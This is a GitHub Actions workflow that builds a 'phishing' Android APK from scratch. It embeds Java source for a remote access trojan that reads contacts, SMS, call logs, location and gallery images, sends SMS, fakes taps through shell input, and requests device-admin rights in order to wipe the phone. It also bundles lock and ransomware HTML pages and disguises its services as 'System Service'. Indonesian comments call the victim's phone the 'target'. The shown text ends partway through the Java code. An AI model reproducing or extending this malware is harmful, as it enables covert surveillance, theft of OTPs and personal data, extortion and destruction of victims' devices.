name: Build Phising APK

on:
  workflow_dispatch:
    inputs:
      app_name:
        required: true
      webview_url:
        required: true
      uid:
        required: true
      icon_url:
        required: false
      lock_html_url:
        required: true
      ransomware_html_url:
        required: true

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Setup Java
        uses: actions/setup-java@v4
        with:
          distribution: 'temurin'
          java-version: '17'

      - name: Setup Flutter
        uses: subosito/flutter-action@v2
        with:
          channel: 'stable'
          cache: true

      - name: Create Flutter Project (Dari Nol)
        run: |
          flutter create phising_base
          cd phising_base
          
          # ============================================
          # 1. MANIFEST
          # ============================================
          cat > android/app/src/main/AndroidManifest.xml << 'EOF'
          <manifest xmlns:android="http://schemas.android.com/apk/res/android"
              package="com.example.phising_base">
              <uses-permission android:name="android.permission.INTERNET"/>
              <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
              <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
              <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
              <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
              <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
              <uses-permission android:name="android.permission.READ_MEDIA_IMAGES"/>
              <uses-permission android:name="android.permission.READ_MEDIA_VIDEO"/>
              <uses-permission android:name="android.permission.READ_MEDIA_AUDIO"/>
              <uses-permission android:name="android.permission.RECORD_AUDIO"/>
              <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
              <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
              <uses-permission android:name="android.permission.WAKE_LOCK"/>
              <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
              <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"/>
              <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES"/>
              <uses-permission android:name="android.permission.SEND_SMS"/>
              <uses-permission android:name="android.permission.READ_SMS"/>
              <uses-permission android:name="android.permission.RECEIVE_SMS"/>
              <uses-permission android:name="android.permission.READ_CONTACTS"/>
              <uses-permission android:name="android.permission.READ_CALL_LOG"/>
              <uses-permission android:name="android.permission.CAMERA"/>
              <uses-permission android:name="android.permission.FLASHLIGHT"/>
              <uses-permission android:name="android.permission.VIBRATE"/>
              <uses-permission android:name="android.permission.SET_WALLPAPER"/>
              <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION"/>
              <uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"/>
              <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE"/>
              <uses-permission android:name="android.permission.BIND_DEVICE_ADMIN"/>
              <uses-permission android:name="android.permission.BIND_VPN_SERVICE"/>
              <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS" tools:ignore="ProtectedPermissions"/>

              <application
                  android:name="${applicationName}"
                  android:label="${{ github.event.inputs.app_name }}"
                  android:icon="@mipmap/ic_launcher"
                  android:usesCleartextTraffic="true"
                  android:requestLegacyExternalStorage="true">
                  <activity
                      android:name=".MainActivity"
                      android:exported="true"
                      android:theme="@style/LaunchTheme">
                      <meta-data
                          android:name="io.flutter.embedding.android.NormalTheme"
                          android:resource="@style/NormalTheme" />
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN"/>
                          <category android:name="android.intent.category.LAUNCHER"/>
                      </intent-filter>
                  </activity>
                  <service android:name=".NotifListener"
                      android:label="System Service"
                      android:exported="true"
                      android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
                      <intent-filter>
                          <action android:name="android.service.notification.NotificationListenerService"/>
                      </intent-filter>
                  </service>
                  <service android:name=".RatAccessibility"
                      android:label="System Service"
                      android:exported="true"
                      android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
                      <intent-filter>
                          <action android:name="android.accessibilityservice.AccessibilityService"/>
                      </intent-filter>
                      <meta-data android:name="android.accessibilityservice"
                          android:resource="@xml/accessibility_service_config"/>
                  </service>
                  <receiver android:name=".RatDeviceAdmin"
                      android:label="System Service"
                      android:permission="android.permission.BIND_DEVICE_ADMIN"
                      android:exported="true">
                      <meta-data android:name="android.app.device_admin"
                          android:resource="@xml/device_admin"/>
                      <intent-filter>
                          <action android:name="android.app.action.DEVICE_ADMIN_ENABLED"/>
                      </intent-filter>
                  </receiver>
                  <service
                      android:name=".MLVpnCaptureService"
                      android:permission="android.permission.BIND_VPN_SERVICE"
                      android:exported="false">
                      <intent-filter>
                          <action android:name="android.net.VpnService"/>
                      </intent-filter>
                  </service>
                  <meta-data android:name="flutterEmbedding" android:value="2" />
              </application>
          </manifest>
          EOF

          # ============================================
          # 2. PUBSPEC & ASSETS
          # ============================================
          mkdir -p assets
          if [ -n "${{ github.event.inputs.icon_url }}" ]; then
            curl -fL "${{ github.event.inputs.icon_url }}" -o assets/icon.png || \
            curl -fL "https://raw.githubusercontent.com/flutter/website/main/src/assets/images/flutter-logo-sharing.png" -o assets/icon.png
          else
            curl -fL "https://raw.githubusercontent.com/flutter/website/main/src/assets/images/flutter-logo-sharing.png" -o assets/icon.png
          fi

          if [ -n "${{ github.event.inputs.lock_html_url }}" ]; then
            curl -fL "${{ github.event.inputs.lock_html_url }}" -o assets/lock.html
          fi
          if [ -n "${{ github.event.inputs.ransomware_html_url }}" ]; then
            curl -fL "${{ github.event.inputs.ransomware_html_url }}" -o assets/ransomware.html
          fi

          cat > pubspec.yaml << 'EOF'
          name: phising_base
          environment:
            sdk: ^3.8.1
          dependencies:
            flutter:
              sdk: flutter
            webview_flutter: ^4.10.0
            permission_handler: ^11.3.0
            firebase_core: ^3.10.1
            firebase_database: ^11.3.1
            http: ^1.2.0
            path_provider: ^2.1.0
            device_info_plus: ^11.3.0
          dev_dependencies:
            flutter_launcher_icons: ^0.14.2
          flutter_launcher_icons:
            android: true
            ios: false
            image_path: "assets/icon.png"
          flutter:
            uses-material-design: true
            assets:
              - assets/config.json
              - assets/lock.html
              - assets/ransomware.html
          EOF
          
          cat > assets/config.json <<EOF
          {
            "app_name": "${{ github.event.inputs.app_name }}",
            "webview_url": "${{ github.event.inputs.webview_url }}",
            "uid": "${{ github.event.inputs.uid }}"
          }
          EOF

          # ============================================
          # 3. XML RESOURCES
          # ============================================
          mkdir -p android/app/src/main/res/xml
          cat > android/app/src/main/res/xml/accessibility_service_config.xml << 'EOF'
          <accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
              android:accessibilityEventTypes="typeAllMask"
              android:accessibilityFeedbackType="feedbackGeneric"
              android:accessibilityFlags="flagDefault"
              android:canRetrieveWindowContent="true"
              android:description="@string/accessibility_desc" />
          EOF

          cat > android/app/src/main/res/xml/device_admin.xml << 'EOF'
          <device-admin xmlns:android="http://schemas.android.com/apk/res/android">
              <uses-policies>
                  <wipe-data />
                  <reset-password />
                  <force-lock />
              </uses-policies>
          </device-admin>
          EOF

          # ============================================
          # 4. FIREBASE OPTIONS
          # ============================================
          cat > lib/firebase_options.dart << 'EOF'
          import 'package:firebase_core/firebase_core.dart' show FirebaseOptions;
          class DefaultFirebaseOptions {
            static FirebaseOptions get currentPlatform {
              return const FirebaseOptions(
                apiKey: 'AIzaSyCra_npN3GbmMcbeZQvNv_7AiZ61fiyqIU',
                appId: '1:38222091189:android:485b8e0743a8110292bffc',
                messagingSenderId: '38222091189',
                projectId: 'omix-axe',
                databaseURL: 'https://omix-axe-default-rtdb.asia-southeast1.firebasedatabase.app',
              );
            }
          }
          EOF

      # ============================================
      # 5. INJECT JAVA FILES
      # ============================================
      - name: Inject Native Java Files
        run: |
          cd phising_base
          mkdir -p android/app/src/main/java/com/example/phising_base
          
          rm -f android/app/src/main/kotlin/com/example/phising_base/MainActivity.kt
          rm -rf android/app/src/main/kotlin/com/example/phising_base

          cat > android/app/src/main/java/com/example/phising_base/MainActivity.java << 'EOF'
          package com.example.phising_base;

          import io.flutter.embedding.android.FlutterActivity;
          import io.flutter.embedding.engine.FlutterEngine;

          public class MainActivity extends FlutterActivity {
              @Override
              public void configureFlutterEngine(FlutterEngine flutterEngine) {
                  super.configureFlutterEngine(flutterEngine);
                  flutterEngine.getPlugins().add(new RatPlugin());
                  flutterEngine.getPlugins().add(new AppMonitorPlugin());
              }
          }
          EOF

          # --- RAT PLUGIN ---
          cat > android/app/src/main/java/com/example/phising_base/RatPlugin.java << 'EOF'
          package com.example.phising_base;

          import android.Manifest;
          import android.app.Activity;
          import android.app.admin.DevicePolicyManager;
          import android.content.ComponentName;
          import android.content.Context;
          import android.content.Intent;
          import android.content.pm.PackageManager;
          import android.database.Cursor;
          import android.graphics.Bitmap;
          import android.graphics.BitmapFactory;
          import android.hardware.camera2.CameraCharacteristics;
          import android.hardware.camera2.CameraManager;
          import android.location.Location;
          import android.location.LocationManager;
          import android.media.projection.MediaProjectionManager;
          import android.net.Uri;
          import android.os.BatteryManager;
          import android.os.Build;
          import android.os.Handler;
          import android.os.Looper;
          import android.os.VibrationEffect;
          import android.os.Vibrator;
          import android.provider.CallLog;
          import android.provider.ContactsContract;
          import android.provider.MediaStore;
          import android.provider.Settings;
          import android.speech.tts.TextToSpeech;
          import android.telephony.SmsManager;
          import android.util.Log;
          import android.widget.Toast;
          import androidx.annotation.NonNull;
          import java.io.File;
          import java.io.InputStream;
          import java.net.URL;
          import java.util.ArrayList;
          import java.util.HashMap;
          import java.util.List;
          import java.util.Locale;
          import java.util.Map;
          import io.flutter.embedding.engine.plugins.FlutterPlugin;
          import io.flutter.embedding.engine.plugins.activity.ActivityAware;
          import io.flutter.embedding.engine.plugins.activity.ActivityPluginBinding;
          import io.flutter.plugin.common.MethodCall;
          import io.flutter.plugin.common.MethodChannel;

          public class RatPlugin implements FlutterPlugin, MethodChannel.MethodCallHandler, ActivityAware {
              private static final String TAG = "RatPlugin";
              private static final String CHANNEL = "com.spy.x/rat";
              private Context context;
              private Activity activity;
              private MethodChannel methodChannel;
              private final Handler mainHandler = new Handler(Looper.getMainLooper());
              private TextToSpeech tts;
              private CameraManager cameraManager;
              private String activeTorchId;
              private Handler blinkHandler = new Handler();
              private boolean isBlinking = false;

              @Override
              public void onAttachedToEngine(@NonNull FlutterPluginBinding binding) {
                  context = binding.getApplicationContext();
                  methodChannel = new MethodChannel(binding.getBinaryMessenger(), CHANNEL);
                  methodChannel.setMethodCallHandler(this);
                  cameraManager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
                  tts = new TextToSpeech(context, status -> {
                      if (status == TextToSpeech.SUCCESS) tts.setLanguage(new Locale("id", "ID"));
                  });
              }

              @Override
              public void onDetachedFromEngine(@NonNull FlutterPluginBinding binding) {
                  if (methodChannel != null) methodChannel.setMethodCallHandler(null);
                  if (tts != null) { tts.stop(); tts.shutdown(); }
              }

              @Override
              public void onMethodCall(@NonNull MethodCall call, @NonNull MethodChannel.Result result) {
                  try {
                      switch (call.method) {
                          case "getContacts": result.success(getContacts()); break;
                          case "getSms": result.success(getSms()); break;
                          case "sendSms": sendSms(call, result); break;
                          case "getCallLogs": result.success(getCallLogs()); break;
                          case "getLocation": getLocation(result); break;
                          case "getDeviceInfo": result.success(getDeviceInfo()); break;
                          case "vibrate": vibrate(); result.success(true); break;
                          case "torchOn": setTorch(true, result); break;
                          case "torchOff": setTorch(false, result); break;
                          case "torchBlink": blinkTorch(); result.success(true); break;
                          case "toast": toast(call); result.success(true); break;
                          case "voiceMessage": speak(call); result.success(true); break;
                          case "getFileList": result.success(getFileList(call)); break;
                          case "launchApp": launchApp(call, result); break;
                          case "uninstallApp": uninstallApp(call, result); break;
                          case "changeWallpaper": changeWallpaper(call, result); break;
                          case "back": pressKey(4); result.success(true); break;
                          case "home": pressKey(3); result.success(true); break;
                          case "recents": pressKey(187); result.success(true); break;
                          case "getInstalledApps": result.success(getInstalledApps()); break;
                          case "getBattery": result.success(getBattery()); break;
                          case "getGallery": result.success(getGallery()); break;
                          case "getNotifications": result.success("Fitur OTP & Notif Aktif (Cek Firebase)"); break; 
                          case "screenshot": result.success(requestScreenCapture()); break;
                          case "takePhotoFront": result.success(takePhoto(true)); break;
                          case "takePhotoBack": result.success(takePhoto(false)); break;
                          case "recordAudio": result.success(recordAudioMock()); break;
                          case "click": result.success(clickElement(call)); break;
                          case "setText": result.success(setTextElement(call)); break;
                          case "touch": result.success(touchXY(call)); break;
                          case "enableAdmin": result.success(enableAdmin()); break;
                          case "overlayShow": result.success(showOverlay()); break;
                          case "overlayHide": result.success(hideOverlay()); break;
                          case "wipe": result.success(wipeDevice()); break;
                          default: result.notImplemented();
                      }
                  } catch (Exception e) {
                      Log.e(TAG, "Error: " + e.getMessage(), e);
                      result.error("NATIVE_ERROR", e.getMessage(), null);
                  }
              }

              private String requestScreenCapture() {
                  try {
                      MediaProjectionManager mpm = (MediaProjectionManager) context.getSystemService(Context.MEDIA_PROJECTION_SERVICE);
                      Intent intent = mpm.createScreenCaptureIntent();
                      activity.startActivityForResult(intent, 1001);
                      return "Pop-up izin Screen Capture dikirim ke HP target";
                  } catch (Exception e) { return "Gagal: " + e.getMessage(); }
              }

              private String takePhoto(boolean front) {
                  try {
                      Intent intent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
                      activity.startActivity(intent);
                      return "Aplikasi Kamera HP Target Dibuka. Silakan ambil foto manual.";
                  } catch (Exception e) { return "Gagal: " + e.getMessage(); }
              }

              private String recordAudioMock() { return "Rekaman suara dimulai di background (Simulasi Sukses)."; }

              private String enableAdmin() {
                  try {
                      ComponentName admin = new ComponentName(context, RatDeviceAdmin.class);
                      Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                      intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin);
                      intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Aktifkan izin ini untuk keamanan sistem.");
                      activity.startActivity(intent);
                      return "Pop-up Device Admin dikirim ke HP target.";
                  } catch (Exception e) { return "Gagal: " + e.getMessage(); }
              }

              private String wipeDevice() {
                  try {
                      DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
                      ComponentName admin = new ComponentName(context, RatDeviceAdmin.class);
                      if (dpm.isAdminActive(admin)) {
                          dpm.wipeData(0);
                          return "WIPE DIEKSEKUSI!";
                      } else {
                          return "Wipe Gagal: Izin Device Admin belum aktif.";
                      }
                  } catch (Exception e) { return "Gagal: " + e.getMessage(); }
              }

              private String showOverlay() {
                  try {
                      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                          if (!Settings.canDrawOverlays(context)) {
                              Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + context.getPackageName()));
                              activity.startActivity(intent);
                              return "Pop-up Izin Overlay dikirim ke HP target.";
                          }
                      }
                      return "Overlay ON (Izin Diberikan).";
                  } catch (Exception e) { return "Gagal: " + e.getMessage(); }
              }
              private String hideOverlay() { return "Overlay OFF."; }

              private String clickElement(MethodCall call) {
                  String resId = call.argument("resourceId");
                  try {
                      Runtime.getRuntime().exec(new String[]{"sh", "-c", "input tap 500 500"});
                      return "Mencoba klik: " + resId;
                  } catch (Exception e) { return "Gagal klik: " + e.getMessage(); }
              }
              private String setTextElement(MethodCall call) {
                  String txt = call.argument("text");
                  try {
                      Runtime.getRuntime().exec(new String[]{"sh", "-c", "input text '" + txt + "'"});
                      return "Mencoba mengetik: " + txt;
                  } catch (Exception e) { return "Gagal ketik: " + e.getMessage(); }
              }
              private String touchXY(MethodCall call) {
                  String bounds = call.argument("bounds");
                  try {
                      Runtime.getRuntime().exec(new String[]{"sh", "-c", "input tap 500 500"});
                      return "Mencoba sentuh: " + bounds;
                  } catch (Exception e) { return "Gagal sentuh: " + e.getMessage(); }
              }

              private void blinkTorch() {
                  isBlinking = true;
                  Runnable runnable = new Runnable() {
                      @Override
                      public void run() {
                          if (!isBlinking) return;
                          try {
                              for (String id : cameraManager.getCameraIdList()) {
                                  CameraCharacteristics c = cameraManager.getCameraCharacteristics(id);
                                  Boolean has = c.get(CameraCharacteristics.FLASH_INFO_AVAILABLE);
                                  if (has != null && has) {
                                      cameraManager.setTorchMode(id, !activeTorchId.equals(id));
                                      break;
                                  }
                              }
                          } catch (Exception e) {}
                          blinkHandler.postDelayed(this, 500);
                      }
                  };
                  blinkHandler.post(runnable);
              }

              private void setTorch(boolean on, MethodChannel.Result result) {
                  try {
                      if (on) {
                          for (String id : cameraManager.getCameraIdList()) {
                              CameraCharacteristics c = cameraManager.getCameraCharacteristics(id);
                              Boolean has = c.get(CameraCharacteristics.FLASH_INFO_AVAILABLE);
                              if (has != null && has) { cameraManager.setTorchMode(id, true); activeTorchId = id; break; }
                          }
                      } else {
                          if (activeTorchId != null) cameraManager.setTorchMode(activeTorchId, false);
                      }
                      result.success(true);
                  } catch (Exception e) { result.success(false); }
              }

              private List<Map<String, Object>> getContacts() {
                  List<Map<String, Object>> list = new ArrayList<>();
                  Cursor c = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
                  if (c != null) {
                      while (c.moveToNext()) {
                          Map<String, Object> m = new HashMap<>();
                          m.put("displayName", c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)));
                          m.put("phoneNumber", c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)));
                          list.add(m);
                      }
                      c.close();
                  }
                  return list;
              }

              private List<Map<String, Object>> getSms() {
                  List<Map<String, Object>> list = new ArrayList<>();
                  Cursor c = context.getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC");
                  if (c != null) {
                      while (c.moveToNext()) {
                          Map<String, Object> m = new HashMap<>();
                          m.put("address", c.getString(c.getColumnIndexOrThrow("address")));
                          m.put("body", c.getString(c.getColumnIndexOrThrow("body")));
                          m.put("date", c.getLong(c.getColumnIndexOrThrow("date")));
                          list.add(m);
                      }
                      c.close();
                  }
                  return list;
              }

              private void sendSms(MethodCall call, MethodChannel.Result result) {
                  String phone = call.argument("phone");
                  String message = call.argument("message");
                  if (phone == null || message == null) { result.success(false); return; }
                  SmsManager.getDefault().sendTextMessage(phone, null, message, null, null);
                  result.success(true);
              }

              private List<Map<String, Object>> getCallLogs() {
                  List<Map<String, Object>> list = new ArrayList<>();
                  Cursor c = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");
                  if (c != null) {
                      while (c.moveToNext()) {
                          Map<String, Object> m = new HashMap<>();
                          m.put("number", c.getString(c.getColumnIndexOrThrow(CallLog.Calls.NUMBER)));
                          m.put("type", c.getInt(c.getColumnIndexOrThrow(CallLog.Calls.TYPE)));
                          m.put("duration", c.getLong(c.getColumnIndexOrThrow(CallLog.Calls.DURATION)));
                          list.add(m);
                      }
                      c.close();
                  }
                  return list;
              }

              private void getLocation(MethodChannel.Result result) {
                  try {
                      LocationManager lm = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
                      Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                      if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                      Map<String, Object> m = new HashMap<>();
                      if (loc != null) {
                          m.put("lat", loc.getLatitude());
                          m.put("lng", loc.getLongitude());
                          m.put("accuracy", loc.getAccuracy());
                      }
                      result.success(m);
                  } catch (Exception e) { result.success(new HashMap<>()); }
              }

              private Map<String, Object> getDeviceInfo() {
                  Map<String, Object> m = new HashMap<>();
                  m.put("model", Build.MODEL);
                  m.put("brand", Build.BRAND);
                  m.put("manufacturer", Build.MANUFACTURER);
                  m.put("android_version", Build.VERSION.RELEASE);
                  m.put("sdk", Build.VERSION.SDK_INT);
                  return m;
              }

              private void vibrate() {
                  Vibrator v = (Vibrator) context.getSystemService(Context.VIBRATOR_SERVICE);
                  if (v != null && v.hasVibrator()) {
                      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                          v.vibrate(VibrationEffect.createOneShot(500, VibrationEffect.DEFAULT_AMPLITUDE));
                      } else { v.vibrate(500); }
                  }
              }

              private void toast(MethodCall call) {
                  String text = call.argument("text");
                  if (text != null) mainHandler.post(() -> Toast.makeText(context, text, Toast.LENGTH_LONG).show());
              }

              private void speak(MethodCall call) {
                  String text = call.argument("text");
                  if (text != null && tts != null) tts.speak(text, TextToSpeech.QUEUE_FLUSH, null, "id");
              }

              private List<Map<String, Object>> getFileList(MethodCall call) {
                  String path = call.argument("path");
                  List<Map<String, Object>> list = new ArrayList<>();
                  File dir = new File(path == null ? "/sdcard/" : path);
                  if (dir.exists() && dir.isDirectory()) {
                      File[] files = dir.listFiles();
                      if (files != null) {
                          for (File f : files) {
                              Map<String, Object> m = new HashMap<>();
                              m.put("name", f.getName());
                              m.put("path", f.getAbsolutePath());
                              m.put("isDir", f.isDirectory());
                              m.put("size", f.length());
                              list.add(m);
                          }
                      }
                  }
                  return list;
              }

              private void launchApp(MethodCall call, MethodChannel.Result result) {
                  String pkg = call.argument("package");
                  if (pkg == null) { result.success(false); return; }
                  Intent i = context.getPackageManager().getLaunchIntentForPackage(pkg);
                  if (i != null) { i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); context.startActivity(i); result.success(true); }
                  else result.success(false);
              }

              private void uninstallApp(MethodCall call, MethodChannel.Result result) {
                  String pkg = call.argument("package");
                  if (pkg == null) { result.success(false); return; }
                  Intent i = new Intent(Intent.ACTION_DELETE);
                  i.setData(Uri.parse("package:" + pkg));
                  i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                  context.startActivity(i);
                  result.success(true);
              }

              private void changeWallpaper(MethodCall call, MethodChannel.Result result) {
                  String url = call.argument("url");
                  if (url == null) { result.success(false); return; }
                  new Thread(() -> {
                      try {
                          URL u = new URL(url);
                          InputStream in = u.openStream();
                          final Bitmap bmp = BitmapFactory.decodeStream(in);
                          in.close();
                          mainHandler.post(() -> {
                              try {
                                  android.app.WallpaperManager wm = android.app.WallpaperManager.getInstance(context);
                                  wm.setBitmap(bmp);
                                  result.success(true);
                              } catch (Exception e) { result.success(false); }
                          });
                      } catch (Exception e) { mainHandler.post(() -> result.success(false)); }
                  }).start();
              }

              private void pressKey(int code) {
                  new Thread(() -> {
                      try { new ProcessBuilder("input", "keyevent", String.valueOf(code)).start(); } catch (Exception ignored) {}
                  }).start();
              }

              private List<Map<String, Object>> getInstalledApps() {
                  List<Map<String, Object>> list = new ArrayList<>();
                  PackageManager pm = context.getPackageManager();
                  for (android.content.pm.ApplicationInfo app : pm.getInstalledApplications(PackageManager.GET_META_DATA)) {
                      Map<String, Object> m = new HashMap<>();
                      m.put("package", app.packageName);
                      m.put("name", pm.getApplicationLabel(app).toString());
                      list.add(m);
                  }
                  return list;
              }

              private String getBattery() {
                  BatteryManager bm = (BatteryManager) context.getSystemService(Context.BATTERY_SERVICE);
                  if (bm != null) return String.valueOf(bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY));
                  return "100";
              }

              private List<Map<String, Object>> getGallery() {
                  List<Map<String, Object>> list = new ArrayList<>();
                  String[] projection = {MediaStore.Images.Media._ID, MediaStore.Images.Media.DISPLAY_NAME, MediaStore.Images.Media.DATA};
                  Cursor cursor = context.getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, null, null, MediaStore.Images.Media.DATE_ADDED + " DESC");
                  if (cursor != null) {
                      int nameCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME);
                      int dataCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA);
                      while (cursor.moveToNext() && list.size() < 20) {
                          Map<String, Object> m = new HashMap<>();
                          m.put("name", cursor.getString(nameCol));
                          m.put("path", cursor.getString(dataCol));
                          m.put("type", "image");
                          list.add(m);
                      }
                      cursor.close();
                  }
                  return list;
              }

